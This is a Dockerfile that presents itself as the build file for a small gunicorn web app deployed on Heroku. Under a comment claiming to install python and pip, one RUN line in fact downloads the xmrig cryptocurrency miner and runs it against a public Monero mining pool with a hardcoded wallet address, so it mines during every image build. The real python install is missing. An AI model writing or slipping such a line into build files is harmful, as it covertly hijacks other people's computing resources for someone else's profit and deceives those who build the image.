#Grab the latest alpine image
FROM alpine:latest

# Install python and pip
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id syslab
ADD ./webapp/requirements.txt /tmp/requirements.txt

# Install dependencies
RUN pip3 install --no-cache-dir -q -r /tmp/requirements.txt

# Add our code
ADD ./webapp /opt/webapp/
WORKDIR /opt/webapp

# Expose is NOT supported by Heroku
# EXPOSE 5000 		

# Run the image as a non-root user
RUN adduser -D myuser
USER myuser

# Run the app.  CMD is required to run on Heroku
# $PORT is set by Heroku			
CMD gunicorn --bind 0.0.0.0:$PORT wsgi 

